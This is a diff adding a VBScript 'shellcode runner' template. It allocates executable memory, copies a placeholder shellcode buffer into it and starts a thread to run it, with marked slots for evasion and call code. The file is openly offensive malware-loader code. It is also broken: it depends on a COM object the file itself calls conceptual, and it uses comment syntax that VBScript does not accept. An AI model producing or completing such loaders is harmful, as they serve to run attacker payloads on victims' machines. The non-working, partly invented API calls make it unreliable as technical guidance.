@@ -1,0 +1,95 @@
+' VBS Shellcode Runner using CreateLocalThread technique
+Option Explicit
+
+//####DEFINE####
+' Win32 API declarations using Windows Script Host COM objects
+Dim objShell, objWMIService, objFSO
+Set objShell = CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+' Constants
+Const MEM_COMMIT = &H1000
+Const MEM_RESERVE = &H2000
+Const PAGE_EXECUTE_READWRITE = &H40
+
+' Create a COM object for Windows API access
+' Note: This requires a COM wrapper DLL to be registered on the system
+' This is a conceptual example - in practice you would need a real COM object
+Dim objWinAPI
+Set objWinAPI = CreateObject("WindowsAPI.NativeMethods")
+
+//####CODE####
+
+Sub Main()
+    //####EVASION####
+    
+    ' Shellcode - Replace with actual shellcode
+    Dim buf
+    buf = ####SHELLCODE####
+    
+    ' Architecture detection
+    Dim is64Bit
+    is64Bit = DetectArch()
+    
+    If is64Bit Then
+        ' Use 64-bit shellcode
+    Else
+        ' Use 32-bit shellcode if needed
+        ' buf = ####SHELLCODE32####
+    End If
+    
+    //####CALL####
+    
+    ' Allocate memory for shellcode
+    Dim addr
+    addr = objWinAPI.VirtualAlloc(0, UBound(buf) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    
+    If addr = 0 Then
+        WScript.Echo "Failed to allocate memory"
+        WScript.Quit
+    End If
+    
+    ' Copy shellcode to allocated memory
+    Dim counter
+    For counter = LBound(buf) To UBound(buf)
+        objWinAPI.WriteMemoryByte addr + counter, buf(counter)
+    Next
+    
+    ' Create thread to execute shellcode
+    Dim threadId, hThread
+    hThread = objWinAPI.CreateThread(0, 0, addr, 0, 0, threadId)
+    
+    If hThread = 0 Then
+        WScript.Echo "Failed to create thread"
+        WScript.Quit
+    End If
+    
+    ' Wait for thread to complete (optional)
+    objWinAPI.WaitForSingleObject hThread, -1
+    
+    ' Clean up
+    objWinAPI.CloseHandle hThread
+End Sub
+
+Function DetectArch()
+    ' Detect if running on 64-bit Windows
+    Dim colItems
+    Set colItems = objWMIService.ExecQuery("Select AddressWidth from Win32_Processor")
+    
+    Dim objItem
+    For Each objItem in colItems
+        If objItem.AddressWidth = 64 Then
+            DetectArch = True
+        Else
+            DetectArch = False
+        End If
+        Exit Function
+    Next
+    
+    ' Default to 32-bit if detection fails
+    DetectArch = False
+End Function
+
+' Execute the main subroutine
+Main
